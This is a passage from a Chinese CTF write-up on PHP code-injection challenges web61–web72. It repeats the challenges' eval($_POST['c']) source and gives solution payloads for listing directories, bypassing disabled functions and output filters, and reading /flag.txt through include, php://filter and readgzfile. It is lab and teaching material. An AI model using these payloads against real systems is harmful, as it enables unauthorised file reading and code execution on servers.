</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>依旧web58</p>
<h4 id="web62">web62<a hidden class="anchor" aria-hidden="true" href="#web62">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>依旧&hellip;</p>
<h4 id="web62-1">web62<a hidden class="anchor" aria-hidden="true" href="#web62-1">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>依旧&hellip;&hellip;</p>
<h4 id="web63">web63<a hidden class="anchor" aria-hidden="true" href="#web63">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>依旧&hellip;&hellip;</p>
<h4 id="web64">web64<a hidden class="anchor" aria-hidden="true" href="#web64">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>嘶，怎么还是那样&hellip;</p>
<h4 id="web65">web65<a hidden class="anchor" aria-hidden="true" href="#web65">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>同上&hellip;</p>
<h4 id="web66">web66<a hidden class="anchor" aria-hidden="true" href="#web66">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>本来以为还是一样的，没想到&hellip;</p>
<p><img alt="image-20241128215426797" loading="lazy" src="assets/image-20241128215426797.png"></p>
<p>看来我们要想办法查目录了</p>
<p>我们可以尝试利用php中查询目录的函数</p>
<p>比如 scandir()</p>
<p><img alt="image-20241128233043919" loading="lazy" src="assets/image-20241128233043919.png"></p>
<pre tabindex="0"><code>var_dump(scandir(&#39;/&#39;));
</code></pre><p><img alt="image-20241128233314034" loading="lazy" src="assets/image-20241128233314034.png"></p>
<p>接下来就是查flag，可以通过文件包含来查</p>
<p><img alt="image-20241128233701394" loading="lazy" src="assets/image-20241128233701394.png"></p>
<p>flag.txt前面记得加上/</p>
<h4 id="web67">web67<a hidden class="anchor" aria-hidden="true" href="#web67">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题解法与web66一致</p>
<h4 id="web68">web68<a hidden class="anchor" aria-hidden="true" href="#web68">#</a></h4>
<p><img alt="image-20241128234343226" loading="lazy" src="assets/image-20241128234343226.png"></p>
<p>这题貌似只是show_source和highlight_file用不了，其他没什么变化</p>
<p>可以直接用前两题的方法</p>
<p>也可以直接</p>
<pre tabindex="0"><code>c=include(&#39;/flag.txt&#39;) //赌
</code></pre><h4 id="web69">web69<a hidden class="anchor" aria-hidden="true" href="#web69">#</a></h4>
<p><img alt="image-20241128234507588" loading="lazy" src="assets/image-20241128234507588.png"></p>
<p>这题相比上一题，print_r() 和 var_dump() 也被禁用了</p>
<p>我们可以通过寻找其他可以打印数组的函数来打印目录</p>
<p>我们可以通过var_export()来代替，从而打印目录</p>
<pre tabindex="0"><code>c=var_export(scandir(&#34;/&#34;));
</code></pre><p><img alt="image-20241129130708792" loading="lazy" src="assets/image-20241129130708792.png"></p>
<p>接下读flag即可</p>
<pre tabindex="0"><code>c=include($_POST[&#39;w&#39;]);&amp;w=php://filter/convert.base64-encode/resource=/flag.txt
</code></pre><p>其他的解法：</p>
<p>查文件</p>
<pre tabindex="0"><code>?c=echo implode(&#34;,&#34;,(scandir(&#39;/&#39;))); 
?c=echo json_encode(scandir(&#34;/&#34;));
</code></pre><p>读文件</p>
<pre tabindex="0"><code>?c=readgzfile(&#39;/flag.txt&#39;);
</code></pre><h4 id="web70">web70<a hidden class="anchor" aria-hidden="true" href="#web70">#</a></h4>
<p><img alt="image-20241129132128259" loading="lazy" src="assets/image-20241129132128259.png"></p>
<p>这题把error_reporting()和ini_set()禁用了</p>
<p>虽然不知道有什么用，不影响我用上一题的方法读flag</p>
<h4 id="web71">web71<a hidden class="anchor" aria-hidden="true" href="#web71">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;display_errors&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="nv">$s</span> <span class="o">=</span> <span class="nx">ob_get_contents</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="nx">ob_end_clean</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">echo</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/[0-9]|[a-z]/i&#34;</span><span class="p">,</span><span class="s2">&#34;?&#34;</span><span class="p">,</span><span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="err">你要上天吗？
</span></span></span></code></pre></div><ul>
<li>
<p><code>$s = ob_get_contents();</code>：获取输出缓冲区的内容并赋值给变量<code>s</code>。输出缓冲区在 PHP 中用于临时存储要输出到浏览器等的内容，以便在合适的时候进行处理或修改。</p>
</li>
<li>
<p><code>ob_end_clean();</code>：清空输出缓冲区并关闭它，这样就清除了原始的、未经处理的输出内容，以便后续进行自定义的输出处理。</p>
</li>
<li>
<p><code>echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</code>：这行代码使用正则表达式对获取到的输出内容（存储在<code>s</code>中）进行替换操作。它会将所有的数字和字母（不区分大小写）都替换为<code>?</code>，然后将处理后的内容输出到浏览器等输出端。</p>
</li>
</ul>
<p>也就是说这道题会对回显进行处理，让我们没法得到回显</p>
<p>我们可以用exit()/die()提前结束程序，从而不执行后续代码直接进行回显</p>
<pre tabindex="0"><code>c=var_export(scandir(&#34;/&#34;));exit();
</code></pre><p><img alt="image-20241129144431247" loading="lazy" src="./assets/image-20241129144431247.png"></p>
<pre tabindex="0"><code>c=readgzfile(&#39;/flag.txt&#39;);exit();
</code></pre><p><img alt="image-20241129144855221" loading="lazy" src="./assets/image-20241129144855221.png"></p>
<h4 id="web72">web72<a hidden class="anchor" aria-hidden="true" href="#web72">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;display_errors&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="nv">$s</span> <span class="o">=</span> <span class="nx">ob_get_contents</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="nx">ob_end_clean</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">echo</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/[0-9]|[a-z]/i&#34;</span><span class="p">,</span><span class="s2">&#34;?&#34;</span><span class="p">,</span><span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="err">你要上天吗？
</span></span></span></code></pre></div><p>这道题一开始还以为和上一题差不多</p>
<p><img alt="image-20241129150755401" loading="lazy" src="./assets/image-20241129150755401.png"></p>
<p>先进行目录查询</p>
<pre tabindex="0"><code>c=var_export(scandir(&#34;./&#34;));exit();
